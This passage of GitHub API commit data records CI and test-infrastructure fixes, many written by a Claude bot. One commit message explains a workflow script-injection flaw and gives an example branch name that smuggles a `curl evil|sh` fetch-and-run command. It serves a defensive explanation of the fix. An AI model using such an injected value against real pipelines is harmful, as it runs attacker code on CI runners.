ow","id":19864447,"login":"web-flow","node_id":"MDQ6VXNlcjE5ODY0NDQ3","organizations_url":"https://api.github.com/users/web-flow/orgs","received_events_url":"https://api.github.com/users/web-flow/received_events","repos_url":"https://api.github.com/users/web-flow/repos","site_admin":false,"starred_url":"https://api.github.com/users/web-flow/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/web-flow/subscriptions","type":"User","url":"https://api.github.com/users/web-flow","user_view_type":"public"},"html_url":"https://github.com/izzywdev/FuzeX/commit/a7486dc7114445d7061108c9d7a800638a55a759","node_id":"C_kwDOO8VI2toAKGE3NDg2ZGM3MTE0NDQ1ZDcwNjExMDhjOWQ3YTgwMDYzOGE1NWE3NTk","parents":[{"html_url":"https://github.com/izzywdev/FuzeX/commit/0c25a457f047afdb170ec85faaad03a475c791f3","sha":"0c25a457f047afdb170ec85faaad03a475c791f3","url":"https://api.github.com/repos/izzywdev/FuzeX/commits/0c25a457f047afdb170ec85faaad03a475c791f3"}],"sha":"a7486dc7114445d7061108c9d7a800638a55a759","url":"https://api.github.com/repos/izzywdev/FuzeX/commits/a7486dc7114445d7061108c9d7a800638a55a759"},{"author":{"avatar_url":"https://avatars.githubusercontent.com/in/1236702?v=4","events_url":"https://api.github.com/users/claude%5Bbot%5D/events{/privacy}","followers_url":"https://api.github.com/users/claude%5Bbot%5D/followers","following_url":"https://api.github.com/users/claude%5Bbot%5D/following{/other_user}","gists_url":"https://api.github.com/users/claude%5Bbot%5D/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/apps/claude","id":209825114,"login":"claude[bot]","node_id":"BOT_kgDODIGtWg","organizations_url":"https://api.github.com/users/claude%5Bbot%5D/orgs","received_events_url":"https://api.github.com/users/claude%5Bbot%5D/received_events","repos_url":"https://api.github.com/users/claude%5Bbot%5D/repos","site_admin":false,"starred_url":"https://api.github.com/users/claude%5Bbot%5D/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/claude%5Bbot%5D/subscriptions","type":"Bot","url":"https://api.github.com/users/claude%5Bbot%5D","user_view_type":"public"},"comments_url":"https://api.github.com/repos/izzywdev/FuzeX/commits/0c25a457f047afdb170ec85faaad03a475c791f3/comments","commit":{"author":{"date":"2026-08-27T04:45:55Z","email":"209825114+claude[bot]@users.noreply.github.com","name":"claude[bot]"},"comment_count":0,"committer":{"date":"2026-08-27T04:45:55Z","email":"noreply@github.com","name":"GitHub"},"message":"fix(design-frames-acceptance): Ajv allErrors, per-file DB isolation, CI gate (#46)\n\n* fix(design-frames-acceptance): drop Ajv allErrors:true\n\nClears the standing ajv-allerrors-true Semgrep finding. The suite only\nasserts pass/fail against the openapi.yaml schema (assertMatchesSchema\nthrows on the first mismatch either way) and never depends on the full\nmulti-error list, so there is no coverage loss.\n\n* fix(design-frames-acceptance): isolate each test file''s Postgres database\n\nnode --test tests/*.test.cjs runs test files concurrently, but every file\nshared one DATABASE_URL and truncated ALL lifecycle tables in its\ntest.before() — a sibling file mid-assertion got its rows wiped out from\nunder it, so a different test flaked on every parallel run (deterministic\ngreen only at --test-concurrency=1).\n\nbootServer() now provisions a private, freshly-migrated database (via the\nreal db/migrate.sh) per test file and drops it again in close(), instead of\ntruncating a shared one. Each file gets its own `design_frames` schema in\nits own database, so parallel execution is safe by construction and no\nserial pin is needed. Proved with 3 consecutive full-suite runs (85/85 each,\nzero leftover ephemeral databases) plus two fully concurrent `npm test`\ninvocations racing the same base Postgres.\n\n03-pagination-precision.test.cjs and 07-frame-refs-gap.test.cjs read past\nthe HTTP boundary via lib/db.cjs for setup/verification; they now target\nsrv.databaseUrl (the file''s own ephemeral database) instead of the base\nDATABASE_URL captured before bootServer() ran.\n\n* ci(design-frames-service): gate on the acceptance suite\n\nThe independent acceptance/contract suite (services/design-frames-service/\nacceptance/) has run nowhere in CI since it landed — the existing `test`\njob only runs the vanilla service''s root npm test. Add an `acceptance` job\nthat spins up a Postgres 16 service container, waits for it healthy, runs\ndb/migrate.sh, builds packages/identity and the backend, then installs and\nruns the acceptance suite against the real backend + real Postgres. No\n`|| true` — a red suite now fails the workflow.\n\nNode 24 for this job (the backend/acceptance toolchain floor); the vanilla\n`test` job stays on Node 20 since its own package.json still targets that\nfloor. Actions pinned to the SHAs already used elsewhere in this repo\n(harden-gate.yml, gate-registration.yml, pages-frames.yml).\n\n* fix(design-frames-acceptance): validate + quote the ephemeral DB identifier\n\nClears the node-postgres-sqli Semgrep finding on the CREATE/DROP DATABASE\nstatements in lib/server.cjs. Postgres DDL can''t parameterize an\nIDENTIFIER the way query(text, params) parameterizes a value, so the\ngenerated database name is now checked against a strict allowlist\n(SAFE_DB_NAME) and double-quoted via a quoteIdent() helper before either\nstatement interpolates it — defensible even though the name is always\ninternally generated, never user input. nosemgrep annotated at both call\nsites with the reason.\n\n---------\n\nCo-authored-by: Claude <noreply@anthropic.com>","tree":{"sha":"6fa6ac3c41a23f47fe4d29564009ef180386fb99","url":"https://api.github.com/repos/izzywdev/FuzeX/git/trees/6fa6ac3c41a23f47fe4d29564009ef180386fb99"},"url":"https://api.github.com/repos/izzywdev/FuzeX/git/commits/0c25a457f047afdb170ec85faaad03a475c791f3","verification":{"payload":"tree 6fa6ac3c41a23f47fe4d29564009ef180386fb99\nparent 6c919b4ee4e0b454d4e190a9dc03108f614765c2\nauthor claude[bot] <209825114+claude[bot]@users.noreply.github.com> 1787805955 +0300\ncommitter GitHub <noreply@github.com> 1787805955 +0300\n\nfix(design-frames-acceptance): Ajv allErrors, per-file DB isolation, CI gate (#46)\n\n* fix(design-frames-acceptance): drop Ajv allErrors:true\n\nClears the standing ajv-allerrors-true Semgrep finding. The suite only\nasserts pass/fail against the openapi.yaml schema (assertMatchesSchema\nthrows on the first mismatch either way) and never depends on the full\nmulti-error list, so there is no coverage loss.\n\n* fix(design-frames-acceptance): isolate each test file''s Postgres database\n\nnode --test tests/*.test.cjs runs test files concurrently, but every file\nshared one DATABASE_URL and truncated ALL lifecycle tables in its\ntest.before() — a sibling file mid-assertion got its rows wiped out from\nunder it, so a different test flaked on every parallel run (deterministic\ngreen only at --test-concurrency=1).\n\nbootServer() now provisions a private, freshly-migrated database (via the\nreal db/migrate.sh) per test file and drops it again in close(), instead of\ntruncating a shared one. Each file gets its own `design_frames` schema in\nits own database, so parallel execution is safe by construction and no\nserial pin is needed. Proved with 3 consecutive full-suite runs (85/85 each,\nzero leftover ephemeral databases) plus two fully concurrent `npm test`\ninvocations racing the same base Postgres.\n\n03-pagination-precision.test.cjs and 07-frame-refs-gap.test.cjs read past\nthe HTTP boundary via lib/db.cjs for setup/verification; they now target\nsrv.databaseUrl (the file''s own ephemeral database) instead of the base\nDATABASE_URL captured before bootServer() ran.\n\n* ci(design-frames-service): gate on the acceptance suite\n\nThe independent acceptance/contract suite (services/design-frames-service/\nacceptance/) has run nowhere in CI since it landed — the existing `test`\njob only runs the vanilla service''s root npm test. Add an `acceptance` job\nthat spins up a Postgres 16 service container, waits for it healthy, runs\ndb/migrate.sh, builds packages/identity and the backend, then installs and\nruns the acceptance suite against the real backend + real Postgres. No\n`|| true` — a red suite now fails the workflow.\n\nNode 24 for this job (the backend/acceptance toolchain floor); the vanilla\n`test` job stays on Node 20 since its own package.json still targets that\nfloor. Actions pinned to the SHAs already used elsewhere in this repo\n(harden-gate.yml, gate-registration.yml, pages-frames.yml).\n\n* fix(design-frames-acceptance): validate + quote the ephemeral DB identifier\n\nClears the node-postgres-sqli Semgrep finding on the CREATE/DROP DATABASE\nstatements in lib/server.cjs. Postgres DDL can''t parameterize an\nIDENTIFIER the way query(text, params) parameterizes a value, so the\ngenerated database name is now checked against a strict allowlist\n(SAFE_DB_NAME) and double-quoted via a quoteIdent() helper before either\nstatement interpolates it — defensible even though the name is always\ninternally generated, never user input. nosemgrep annotated at both call\nsites with the reason.\n\n---------\n\nCo-authored-by: Claude <noreply@anthropic.com>","reason":"valid","signature":"-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqj8EDCRC1aQ7uu5UhlAAA6YIQAJCDFVIAomlQVaSzph6huuj7\nLQAjPbq61O9qgq3p8cG0iUd63/yoTs43B46/2eQ0e0zJxxiwHJ46nrxGEhwL0iDY\n8Er/2XuOtTqKiNF44/xE3x8vwRgO7BL77oh8oBltMqreLRLxZ7Xojv2Pm/adM32D\nHSjN3ODwwg1rL4xdc/nM36UoNC+US/95BYd4AwfURdMyenkSPsf6+3UV/oYgu37m\n5n8oXA74dIsvFXlRYNGBvfJ9y9UHSyItQNkiNa9q+z60nCwIoAReBZvdwLZw65Y1\ndyq33I4mgV8L+ojPvPTlo48Uibb61RW9dKe9sAyt1VggGtj+K0fgahaeZ+lJb1vn\nK8TgQsXpyHXk4dwi/MwG3Ewah99cNSN48Vx4tAnphyUAYdDSavAn1k0KP+DIUnxs\nPsVzOV37WvEG7DBu1BRKRzWCTpjn/Nkb1fJeU+Ml48vncr6MNm1y1n9rwsMNWz+a\nArl2hGb0o5nvx6Vj62agaVDY6shmNijZ9K0bomNm7nhBrogj8/A428IqNlzm0LId\nZVNg3d+SBuJuwZFR75K69bSnob+37EemfN3+9BwVtnwGroyChu1yv1a2FVDS9Ur1\nf+LtsL5fIKcfFzEWZJ0WWy9iIGq6Qdj0euSBgVZ1acr0q4nTG8F/8pZWpmqhTx7t\n3xGwFUzGU1Z7MuufbS94\n=mdWJ\n-----END PGP SIGNATURE-----\n","verified":true,"verified_at":"2026-08-27T04:45:55Z"}},"committer":{"avatar_url":"https://avatars.githubusercontent.com/u/19864447?v=4","events_url":"https://api.github.com/users/web-flow/events{/privacy}","followers_url":"https://api.github.com/users/web-flow/followers","following_url":"https://api.github.com/users/web-flow/following{/other_user}","gists_url":"https://api.github.com/users/web-flow/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/web-flow","id":19864447,"login":"web-flow","node_id":"MDQ6VXNlcjE5ODY0NDQ3","organizations_url":"https://api.github.com/users/web-flow/orgs","received_events_url":"https://api.github.com/users/web-flow/received_events","repos_url":"https://api.github.com/users/web-flow/repos","site_admin":false,"starred_url":"https://api.github.com/users/web-flow/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/web-flow/subscriptions","type":"User","url":"https://api.github.com/users/web-flow","user_view_type":"public"},"html_url":"https://github.com/izzywdev/FuzeX/commit/0c25a457f047afdb170ec85faaad03a475c791f3","node_id":"C_kwDOO8VI2toAKDBjMjVhNDU3ZjA0N2FmZGIxNzBlYzg1ZmFhYWQwM2E0NzVjNzkxZjM","parents":[{"html_url":"https://github.com/izzywdev/FuzeX/commit/6c919b4ee4e0b454d4e190a9dc03108f614765c2","sha":"6c919b4ee4e0b454d4e190a9dc03108f614765c2","url":"https://api.github.com/repos/izzywdev/FuzeX/commits/6c919b4ee4e0b454d4e190a9dc03108f614765c2"}],"sha":"0c25a457f047afdb170ec85faaad03a475c791f3","url":"https://api.github.com/repos/izzywdev/FuzeX/commits/0c25a457f047afdb170ec85faaad03a475c791f3"},{"author":{"avatar_url":"https://avatars.githubusercontent.com/u/99821070?v=4","events_url":"https://api.github.com/users/izzywdev/events{/privacy}","followers_url":"https://api.github.com/users/izzywdev/followers","following_url":"https://api.github.com/users/izzywdev/following{/other_user}","gists_url":"https://api.github.com/users/izzywdev/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/izzywdev","id":99821070,"login":"izzywdev","node_id":"U_kgDOBfMmDg","organizations_url":"https://api.github.com/users/izzywdev/orgs","received_events_url":"https://api.github.com/users/izzywdev/received_events","repos_url":"https://api.github.com/users/izzywdev/repos","site_admin":false,"starred_url":"https://api.github.com/users/izzywdev/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/izzywdev/subscriptions","type":"User","url":"https://api.github.com/users/izzywdev","user_view_type":"public"},"comments_url":"https://api.github.com/repos/izzywdev/FuzeX/commits/6c919b4ee4e0b454d4e190a9dc03108f614765c2/comments","commit":{"author":{"date":"2026-08-26T05:42:58Z","email":"99821070+izzywdev@users.noreply.github.com","name":"Israel Weinberg"},"comment_count":0,"committer":{"date":"2026-08-26T05:42:58Z","email":"noreply@github.com","name":"GitHub"},"message":"fix(helm): enable the same-origin portal mount in production (#52)\n\nWITHOUT THIS THE APP CANNOT LOAD IN THE PORTAL. `federatedMount.enabled`\ndefaults to false in values.yaml and values-prod.yaml never overrode it, so\nproduction had no /apps/fuzex Ingress at all. The FuzeFront shell resolves\n`integration.remoteEntry` against its own origin, the request fell through to\nthe shell''s SPA fallback, and the browser got a 404 — or a 200 serving the\nshell''s own index.html, which is worse because it looks like a success.\n\nMeasured across the fleet on 2026-08-26: 11 of 17 products were unmounted for\nexactly this reason, which is why zero remotes were serving a module in\nproduction while the portal listed them.\n\nVerified by rendering the chart with values-prod.yaml: the mount Ingress now\nappears with path /apps/fuzex, matching integration.remoteEntry in\nregistration/manifest.json. The four layers that must agree — registered\nremoteEntry, the remote''s build base, this Ingress path, and the nginx\nlocation — do.\n\nAdditive only: this creates a route that did not exist. It cannot change the\nbehaviour of anything already working.\n\n\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\nCo-authored-by: Claude Opus 5 <noreply@anthropic.com>","tree":{"sha":"b0b5adcb6a2df555a83c70533b82356dab1a28f1","url":"https://api.github.com/repos/izzywdev/FuzeX/git/trees/b0b5adcb6a2df555a83c70533b82356dab1a28f1"},"url":"https://api.github.com/repos/izzywdev/FuzeX/git/commits/6c919b4ee4e0b454d4e190a9dc03108f614765c2","verification":{"payload":"tree b0b5adcb6a2df555a83c70533b82356dab1a28f1\nparent c3810761fa9b2f92f5462ce0ed04e2e3ae47ab05\nauthor Israel Weinberg <99821070+izzywdev@users.noreply.github.com> 1787722978 +0300\ncommitter GitHub <noreply@github.com> 1787722978 +0300\n\nfix(helm): enable the same-origin portal mount in production (#52)\n\nWITHOUT THIS THE APP CANNOT LOAD IN THE PORTAL. `federatedMount.enabled`\ndefaults to false in values.yaml and values-prod.yaml never overrode it, so\nproduction had no /apps/fuzex Ingress at all. The FuzeFront shell resolves\n`integration.remoteEntry` against its own origin, the request fell through to\nthe shell''s SPA fallback, and the browser got a 404 — or a 200 serving the\nshell''s own index.html, which is worse because it looks like a success.\n\nMeasured across the fleet on 2026-08-26: 11 of 17 products were unmounted for\nexactly this reason, which is why zero remotes were serving a module in\nproduction while the portal listed them.\n\nVerified by rendering the chart with values-prod.yaml: the mount Ingress now\nappears with path /apps/fuzex, matching integration.remoteEntry in\nregistration/manifest.json. The four layers that must agree — registered\nremoteEntry, the remote''s build base, this Ingress path, and the nginx\nlocation — do.\n\nAdditive only: this creates a route that did not exist. It cannot change the\nbehaviour of anything already working.\n\n\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\nCo-authored-by: Claude Opus 5 <noreply@anthropic.com>","reason":"valid","signature":"-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqjnziCRC1aQ7uu5UhlAAASmUQAHIHsjjrh9Ohx/gQzWrM237y\nDxKB0lhA94aJgjscpTYqeNtaga7GgeQs6fUqFd5ZoI+Kb2T0bH6mmwO6x3jkVyyL\nNpcct2/n+P3RYnwKzaZ7/v3FrIJ/Ih4m4AcfoxL4T0nU0U4AlxEoNJ2GA6MPYZ5g\nPDlTUjFEtUkfsSYs+K6Fg8sRdzkVT7zAyF6u9cq1X+IwxJ6JxL66FjLnMv8ueKLT\nUkBPoYVuVShJ5Xcml0gsc6pxInUZox5e+N9utTMk++w21DVyOkwUGPZ7T4tGuoZy\nqJOx7o8EIszJhkcdEJXmMEpocER7gwJex0DORmrM+ATkGTnXiAWoa5l542+I1kyw\naMf/skS1OHjweVVICd/iCMDITzjXRjn7tBCIJz4JlEUYvZPIy9KK6pLqabVXltHc\nbyaro0jDZ+4u6U8H9YGsdhQL6XZ5E9WWK5cVoZk6GIZ6HuLfFNIu65zOGGx2BKyi\nNUR7N/troQX2nfK6AquyRQi7AvJ2w8oJAZ2UuUknQcfJeo919COshFt+ZvjjpC6k\nPPbZQHTFy1XOgHS9WleVitpo/+9P0p9jUXxRhcbaNvlA5tVU92dINuDQ22D4wlHl\n3kDmZPpSu6SxE+UnTEpLbS9wjRzKZIkpMHncshori1zWRcACpMAM+IDXm7AB+dX0\n9V3GC2vFEzMfdFS3gQD2\n=/6hZ\n-----END PGP SIGNATURE-----\n","verified":true,"verified_at":"2026-08-26T05:42:58Z"}},"committer":{"avatar_url":"https://avatars.githubusercontent.com/u/19864447?v=4","events_url":"https://api.github.com/users/web-flow/events{/privacy}","followers_url":"https://api.github.com/users/web-flow/followers","following_url":"https://api.github.com/users/web-flow/following{/other_user}","gists_url":"https://api.github.com/users/web-flow/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/web-flow","id":19864447,"login":"web-flow","node_id":"MDQ6VXNlcjE5ODY0NDQ3","organizations_url":"https://api.github.com/users/web-flow/orgs","received_events_url":"https://api.github.com/users/web-flow/received_events","repos_url":"https://api.github.com/users/web-flow/repos","site_admin":false,"starred_url":"https://api.github.com/users/web-flow/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/web-flow/subscriptions","type":"User","url":"https://api.github.com/users/web-flow","user_view_type":"public"},"html_url":"https://github.com/izzywdev/FuzeX/commit/6c919b4ee4e0b454d4e190a9dc03108f614765c2","node_id":"C_kwDOO8VI2toAKDZjOTE5YjRlZTRlMGI0NTRkNGUxOTBhOWRjMDMxMDhmNjE0NzY1YzI","parents":[{"html_url":"https://github.com/izzywdev/FuzeX/commit/c3810761fa9b2f92f5462ce0ed04e2e3ae47ab05","sha":"c3810761fa9b2f92f5462ce0ed04e2e3ae47ab05","url":"https://api.github.com/repos/izzywdev/FuzeX/commits/c3810761fa9b2f92f5462ce0ed04e2e3ae47ab05"}],"sha":"6c919b4ee4e0b454d4e190a9dc03108f614765c2","url":"https://api.github.com/repos/izzywdev/FuzeX/commits/6c919b4ee4e0b454d4e190a9dc03108f614765c2"},{"author":{"avatar_url":"https://avatars.githubusercontent.com/u/99821070?v=4","events_url":"https://api.github.com/users/izzywdev/events{/privacy}","followers_url":"https://api.github.com/users/izzywdev/followers","following_url":"https://api.github.com/users/izzywdev/following{/other_user}","gists_url":"https://api.github.com/users/izzywdev/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/izzywdev","id":99821070,"login":"izzywdev","node_id":"U_kgDOBfMmDg","organizations_url":"https://api.github.com/users/izzywdev/orgs","received_events_url":"https://api.github.com/users/izzywdev/received_events","repos_url":"https://api.github.com/users/izzywdev/repos","site_admin":false,"starred_url":"https://api.github.com/users/izzywdev/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/izzywdev/subscriptions","type":"User","url":"https://api.github.com/users/izzywdev","user_view_type":"public"},"comments_url":"https://api.github.com/repos/izzywdev/FuzeX/commits/c3810761fa9b2f92f5462ce0ed04e2e3ae47ab05/comments","commit":{"author":{"date":"2026-08-24T22:30:25Z","email":"99821070+izzywdev@users.noreply.github.com","name":"Israel Weinberg"},"comment_count":0,"committer":{"date":"2026-08-24T22:30:25Z","email":"noreply@github.com","name":"GitHub"},"message":"refactor(ci): route claude-code-action call sites through fuze-code-action (#48)\n\n* refactor(ci): route claude-code-action call sites through fuze-code-action\n\nReplaces every `anthropics/claude-code-action@<sha>` call site in this repo with\nthe vendored `./.github/actions/fuze-code-action` wrapper, collapsing the fleet''s\npin drift (8 distinct refs for one action, including a MUTABLE `v1` tag) to a\nsingle pin inside the action.\n\nThe wrapper tries providers in order and falls through ONLY on an AVAILABILITY\nfailure — credit/quota exhausted, auth failure, rate limit, 5xx, or the provider\ncould not start. NEVER on a task failure. Retrying a genuine review finding or a\nreal build break against a second vendor would convert an honest red into a\ngreen, which is the defect this exists to remove, not introduce.\n\nVendored rather than referenced cross-repo because the action does\n`uses: ./.github/actions/llm-endpoint`, and a relative path inside a composite\naction consumed from another repository is exactly what breaks. llm-endpoint is\nvendored alongside it for the same reason.\n\nMENTION MODE: `claude.yml` passes no prompt — claude-code-action derives the task\nfrom the triggering GitHub event. codex-action and run-gemini-cli have no GitHub\nevent context at all, so with an empty prompt they cannot see the task; a rung\nthat \"succeeded\" there would report success for work nobody performed. The\nwrapper therefore DISABLES the fallover chain when no task-prompt is given, says\nso in a ::warning:: rather than skipping silently, and fails if rung 1 fails.\n\nVerified, not assumed: a checker parses this repo''s workflows BEFORE and AFTER as\nYAML and asserts every original `with:` input and every `env:` var is still\ncarried, under its mapped name or via the action''s extra-env passthrough. Zero\nlosses. The action ships 37 of its own tests (27 classify + 3 rung-gating +\n7 extra-env), all passing.\n\nCo-Authored-By: Claude Opus 5 <noreply@anthropic.com>\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\n* test(fuze-code-action): replace the gate evaluator''s eval() with a real parser\n\nSemgrep flagged python.lang.security.audit.eval-detected on the mini\nexpression evaluator in test_rung_gating.py, and it was right to: the helper\nstring-substituted context values into the `if:` text and handed the result to\neval(), so any GitHub expression syntax it did not recognise was silently\nreinterpreted under Python''s operator rules rather than rejected.\n\nReplaced with a tokenizer + recursive-descent parser over the exact subset the\naction''s gates use (&&, ||, !, ==, !=, parentheses, string literals, context\nlookups, always()). This is stricter, not merely safer: unsupported syntax and\ncontext keys the test never supplied now raise GateSyntaxError instead of\nevaluating, so an `if:` the harness cannot parse is reported as an UNCHECKED\ngate rather than silently counted as False.\n\nAdded TestEvaluator covering comparisons, && binding tighter than ||,\nparenthesised grouping, bare-operand truthiness, and that each unsupported form\nraises — the evaluator is what the invariants are measured with, so a permissive\none would pass every assertion while proving nothing about the real gates.\n\nVendored from FuzeSDLC (feat/fuze-code-action). Suppressing the finding was not\nan option: a nosemgrep comment leaves the weaker evaluator in place.\n\n* ci: clear the actionlint findings the migration brought into scope\n\nactionlint only lints workflow files a PR changes, so routing every\nclaude-code-action call site through fuze-code-action pulled several\nlong-standing findings into scope. They are real; fixing them is the job.\n\nnightly-integration.yml — two shellcheck findings (SC2129 on consecutive\n$GITHUB_ENV redirects, SC2086 on an unquoted $envf). The vendored copy was\nSTALE: FuzeSDLC''s canonical template already carries both fixes, so this\nreconciles to it byte-for-byte rather than inventing a third form. The\n`envf` fix is substantive, not style — an array keeps `--env-file <path>`\ntwo words while surviving a path containing a space.\n\nclaude.yml (fuzemerchandize, fuzeplan, fuzeservice) — script injection.\n`github.event.pull_request.head.ref` was interpolated into an inline `run:`\nwith ${{ }}, which substitutes into the shell SOURCE before bash parses it.\nA fork branch named `x\";curl evil|sh;\"` executes on the runner. Moved that\nand every sibling context read to `env:` so they arrive as data.\n\nclaude-autofix-post-prod.yml (FuzeFront) — SC2129 on three consecutive\n$GITHUB_OUTPUT redirects.\n\nVerified with actionlint 1.7.12 (the CI-pinned version) over every changed\nworkflow file in all 17 repos: clean.\n\n* fix(fuze-code-action): rung 2 had never once executed — empty passthrough killed it\n\n`codex-safety-strategy` defaulted to '''' and was forwarded verbatim as\ncodex-action''s `safety-strategy`. An empty `with:` value OVERRIDES the callee''s\nown `default:` rather than falling back to it, and codex-action declares that\ninput `default: ''drop-sudo''` and rejects an empty one outright. Every\ninvocation therefore died in codex-action''s `resolve-codex-home` step with\n\"Invalid safety strategy: .\" before Codex ran. Rung 2 — the entire reason this\naction exists — had never executed. The chain then correctly reported itself\nexhausted and failed, so the symptom looked like \"no vendor available\" rather\nthan \"the fallover is broken\".\n\n  - codex-safety-strategy: '''' -> ''drop-sudo'' (codex-action''s own default).\n  - codex-sandbox: ''read-only'' -> ''workspace-write''. Rung 2 is the fallover for\n    work rung 1 would have COMMITTED (the a2a/mcp maintainers edit and push). A\n    read-only Codex runs to completion having changed nothing and reports\n    success — a vacuous green, which is what this action exists to prevent.\n\nNew __tests__/test_passthrough_defaults.py generalises the rule: for every input\nforwarded to a third-party action, if the CALLEE declares a non-empty default,\nthis action''s own default must be non-empty or the step must be gated on\n`inputs.X != ''''`. The callee tables are recorded from the exact pinned SHAs and\nare offline on purpose; an unrecorded `uses:` fails, so a pin bump forces\nre-reading that action''s inputs instead of carrying a stale table forward.\n\nVerified by mutation: restoring `default: ''''` fails 2 assertions, and bumping\nthe codex pin fails the pin-recorded test. Run-gemini-cli''s `prompt` has the\nsame shape (callee default \"You are a helpful assistant.\") and passes only\nbecause rung 3 is gated on `inputs.task-prompt != ''''` — the test recognises\nthat gate rather than special-casing it.\n\n* fix(llm-endpoint): the docker failure diagnostic was unreachable, and a one-vendor chain needs no container\n\nSymptom: `mcp-maintain` / `a2a-maintain` failing with a bare \"Process completed\nwith exit code 125\" from the resolve step, no error title, no docker log — so\nrung 1 never started and the whole fallover chain reported itself exhausted.\nOnly the four repos carrying the multi-vendor llm-endpoint were affected; the\nrepos still on the single-vendor version route direct to Anthropic and were fine.\n\nThree fixes, in order of what they cost:\n\n1. THE DIAGNOSTIC WAS UNREACHABLE. `docker run ...; run_rc=$?` cannot work: the\n   runner invokes `shell: bash` steps with `-e` already on, and `set -uo pipefail`\n   at the top of the script does not turn it off, so a failing `docker run` aborts\n   the step before `run_rc` is ever assigned. The `if [ $run_rc -ne 0 ]` branch —\n   which prints the error title AND docker-run.log — was dead code from the day it\n   was written. Rewritten as `if docker run ...; then rc=0; else rc=$?; fi`, a\n   tested context, the one place errexit is defined not to apply. This is the same\n   trap the classify step already documents; it was not applied here.\n\n2. A SINGLE-VENDOR CHAIN NOW ROUTES DIRECT. When only anthropic has a key — the\n   actual configuration in all four repos — the old path still started a\n   runner-local LiteLLM whose model_list had one entry and whose router_settings\n   had no `fallbacks:`. That buys nothing a direct api.anthropic.com call does not,\n   and adds a docker dependency the runner may not satisfy. openai/gemini still go\n   through LiteLLM, since it is what translates them into the Anthropic shape\n   claude-code-action speaks.\n\n3. A CONTAINER THAT WILL NOT START DEGRADES INSTEAD OF KILLING THE CHAIN. If\n   anthropic is in the available chain, fall back to the direct leg — the path this\n   action used before the multi-vendor chain existed. This is a real working path,\n   not a mask: the `::warning::` states exactly what was lost (no automatic advance\n   past anthropic on a quota/auth error), so a degraded run stays distinguishable\n   from a good one. With no anthropic key there is no Anthropic-shape endpoint at\n   all, and it still fails closed.\n\nVerified by running the extracted script against stubbed docker/curl:\nanthropic-only exits 0 without invoking docker; anthropic+openai with docker\nfailing exits 0 on the degraded leg and emits the warning; openai-only with docker\nfailing exits 1 and prints the fail-closed error.\n\n* ci(claude): wire openai + gemini keys — two of three rungs were unreachable\n\n`claude.yml` passed only `anthropic-api-key` (and `litellm-key`) to\nfuze-code-action. Rungs 2 and 3 are gated on `inputs.openai-api-key != ''''` and\n`inputs.gemini-api-key != ''''`, so with those inputs absent the action reported\n\"structurally supported, skipped — no key\" and fell straight to an exhausted\nchain. A fallover chain that advertises three vendors and can only ever reach\none is the same shape of defect as a gate that passes without looking.\n\nThe secrets already exist at the org/repo level; only the wiring was missing.\nNothing here changes behaviour where a secret is genuinely unset — the rung\nstill skips with its notice, and the chain still fails closed.\n\n* fix(fuze-code-action): \"the rung declined to run\" is not a failure — third verdict\n\nRoot cause of the a2a-maintain / mcp-maintain reds on every migration PR, from\nthe job log:\n\n  Skipping action due to workflow validation: the workflow file must exist and\n  have identical content to the version on the repository''s default branch.\n\nclaude-code-action refuses to run when the pull request modifies the workflow\nfile that invokes it — which every workflow-migration PR does by construction.\nIt exits 0 and reports NO conclusion. classify.sh read an empty conclusion as\n\"action-could-not-start\", classified it availability, fell through to rungs 2\nand 3, found no keys, and failed the job.\n\nBoth halves of that were wrong. Falling through runs the other vendors on\nexactly the task the guard exists to prevent. Failing reports a break that did\nnot happen — nothing is wrong with the repo, the action, or the credentials.\n\nSo: exit code 3, `declined`. Does not fall through, does not fail. The Finish\nstep exits 0 with mode=declined and conclusion=neutral, and BOTH the rung notice\nand the finish warning state plainly that no work was performed and that\nwhatever this workflow maintains was NOT checked on this commit. A neutral run\nstays distinguishable from a run that did the job — it is not being quietly\nrecoloured green.\n\nThe distinction is keyed on the RUNNER''s own outcome for the step, threaded in\nas classify.sh''s new third argument. A rung that genuinely could not start\nreports outcome=failure (or none) and still classifies as availability and still\nfalls through; only a step the runner says SUCCEEDED can decline.\n\nTests: test_classify.sh 27 -> 34 cases, including the four that pin the\ndistinction (succeeded -> declined; failed / skipped / absent -> availability)\nand two that prove a real conclusion is never reclassified by the new argument.\ntest_rung_gating.py sweeps code \"3\" too — 72 -> 96 combinations — asserting a\ndecline never reaches rungs 2 or 3.\n\nVerified by mutation in both directions: deleting the branch fails 2 cases,\nand widening it to ignore the step outcome fails 4.\n\n* fix(governance-sync): rebase and retry — a branch that moved is not a governance failure\n\ngovernance-sync commits its reconciliation onto a LIVE PR branch, then pushed\nwith a bare `git push`. Any push the PR author makes between this job''s checkout\nand its push wins the race, and the push is rejected with\n\n    ! [rejected]  HEAD -> <branch> (fetch first)\n\nwhich failed the job. That turned an ordinary race into a red check saying\nnothing about governance. It happened three times in one afternoon during a\nfleet-wide migration; FuzeSales#64 is the recorded instance.\n\nNow: on rejection, rebase onto the branch that moved and retry, up to three\ntimes. Deliberately NOT `|| true` — if the push still cannot land, or the rebase\nconflicts, it errors and fails with a message naming the remedy. A push that\ngenuinely cannot happen is a real failure and must stay one.\n\nFuzeHub carried an older variant that ended in\n`|| echo \"::warning::commit-back push failed (token may be read-only)\"`, i.e. a\npush failure could never red anything. That is the same vacuous shape from the\nopposite side, so it is reconciled to the canonical form with the rest. If its\ntoken really is read-only, this will now surface it instead of muffling it —\nwhich is the point.\n\n* fix(fuze-code-action): unterminated quote broke classify, and NOTHING ran the tests\n\nTwo defects, and the second is why the first shipped.\n\n1. The `::warning::` I added to the rung-1 classify step wrote an apostrophe with\n   the `''\"''\"''` idiom. That is correct inside SINGLE quotes; the string was\n   